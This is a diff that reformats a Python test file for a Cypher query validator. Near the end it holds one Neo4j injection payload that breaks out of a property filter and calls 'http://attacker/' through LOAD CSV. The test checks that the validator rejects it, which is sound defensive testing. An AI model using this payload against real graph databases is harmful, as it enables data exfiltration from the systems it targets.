@@ -1,11 +1,16 @@
-import pytest
-
 from reporting.services.query_validator import validate_query
 from reporting.services.query_validator import ValidationResult
 
 
-def _mock_cyver(mocker, syntax_ok=True, schema_ok=True, props_ok=True,
-                syntax_meta=None, schema_meta=None, props_meta=None):
+def _mock_cyver(
+    mocker,
+    syntax_ok=True,
+    schema_ok=True,
+    props_ok=True,
+    syntax_meta=None,
+    schema_meta=None,
+    props_meta=None,
+):
     mocker.patch(
         "reporting.services.query_validator.SyntaxValidator"
     ).return_value.validate.return_value = (
@@ -43,7 +48,9 @@ def test_validate_query_syntax_error_is_error(mocker):
     _mock_cyver(
         mocker,
         syntax_ok=False,
-        syntax_meta=[{"code": "SyntaxError", "description": "Syntax error at position 5"}],
+        syntax_meta=[
+            {"code": "SyntaxError", "description": "Syntax error at position 5"}
+        ],
     )
     result = validate_query("MATC (n) RETURN n")
     assert result.has_errors
@@ -98,7 +105,9 @@ def test_validate_query_properties_issue_is_warning(mocker):
     _mock_cyver(
         mocker,
         props_ok=False,
-        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
+        props_meta=[
+            {"code": "PropertiesError", "description": "Unknown property: bar"}
+        ],
     )
     result = validate_query("MATCH (n) WHERE n.bar = 1 RETURN n")
     assert not result.has_errors
@@ -112,7 +121,9 @@ def test_validate_query_multiple_warnings(mocker):
         schema_ok=False,
         schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
         props_ok=False,
-        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
+        props_meta=[
+            {"code": "PropertiesError", "description": "Unknown property: bar"}
+        ],
     )
     result = validate_query("MATCH (n:Foo) WHERE n.bar = 1 RETURN n")
     assert not result.has_errors
@@ -210,8 +221,7 @@ class TestNeo4jectionStringInjection:
     def test_property_filter_breakout(self, mocker):
         _mock_cyver(mocker)
         result = validate_query(
-            "'=' LOAD CSV FROM 'http://attacker/' as l "
-            "WITH 0 as _l00 RETURN 1 //"
+            "'=' LOAD CSV FROM 'http://attacker/' as l " "WITH 0 as _l00 RETURN 1 //"
         )
         assert result.has_errors
 
